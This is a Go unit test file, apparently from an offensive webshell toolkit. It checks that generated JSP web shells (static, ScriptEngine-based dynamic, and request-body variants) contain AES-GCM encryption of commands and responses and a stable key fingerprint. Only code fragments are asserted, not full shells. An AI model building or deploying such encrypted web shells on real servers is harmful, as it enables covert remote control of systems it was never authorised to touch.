package jsp

import (
	"strings"
	"testing"
)

var cryptoShellTestKey = []byte("0123456789abcdef0123456789abcdef")

func TestCryptoShellSourceUsesFragment(t *testing.T) {
	src := CryptoShellSource(cryptoShellTestKey)
	for _, want := range []string{
		"String dec(String e)",
		"String enc(String s)",
		"AES/GCM/NoPadding",
		"GCMParameterSpec(128",
		"javax.crypto.Cipher",
	} {
		if !strings.Contains(src, want) {
			t.Fatalf("crypto static shell 缺少 %q:\n%s", want, src)
		}
	}
	if !strings.Contains(src, "out.print(enc(__sw.toString()))") {
		t.Fatalf("shell 应加密响应输出:\n%s", src)
	}
}

func TestCryptoDynamicShellSourceUsesFragment(t *testing.T) {
	src := CryptoDynamicShellSource(cryptoShellTestKey)
	if !strings.Contains(src, "String dec(String e)") || !strings.Contains(src, "AES/GCM/NoPadding") {
		t.Fatalf("dynamic shell 未注入 fragment:\n%s", src)
	}
	if !strings.Contains(src, "ScriptEngine") {
		t.Fatalf("dynamic shell 缺少 ScriptEngine:\n%s", src)
	}
}

func TestCryptoBodyShellSourceGolden(t *testing.T) {
	src := CryptoBodyShellSource(cryptoShellTestKey)
	for _, want := range []string{
		"HttpServletRequestWrapper",
		"getParameterMap",
		"getParameterValues",
		DefaultCryptoField,
		"__rbs_parseBody",
		"AES/GCM/NoPadding",
		"__rbs_req.getParameter(\"z1\")",
		"out.print(enc(__sw.toString()))",
	} {
		if !strings.Contains(src, want) {
			t.Fatalf("body shell 缺少 %q:\n%s", want, src)
		}
	}
	if strings.Contains(src, "request.getParameter(\"z1\")") {
		t.Fatalf("模板代码应指向 wrapped request:\n%s", src)
	}
}

func TestCryptoShellMeta(t *testing.T) {
	mode, fp := CryptoShellMeta(cryptoShellTestKey)
	if mode != "aes-gcm" {
		t.Fatalf("mode 应为 aes-gcm，got %q", mode)
	}
	_, fp2 := CryptoShellMeta(cryptoShellTestKey)
	if fp2 != fp {
		t.Fatalf("fingerprint 应稳定: %q != %q", fp2, fp)
	}
	if len(fp) != 16 {
		t.Fatalf("fingerprint 应为 16 个 hex 字符，got %q", fp)
	}
}
